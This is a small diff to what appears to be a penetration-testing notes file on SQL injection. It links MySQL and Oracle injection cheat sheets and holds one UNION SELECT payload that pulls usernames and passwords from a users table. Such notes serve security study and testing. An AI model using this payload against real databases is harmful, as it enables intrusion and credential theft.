@@ -21,3 +21,6 @@ https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 
 
 1 UNION ALL SELECT NULL,concat(0x28,username,0x3a,password,0x29)+FROM+users--
+
+Oracle :
+https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
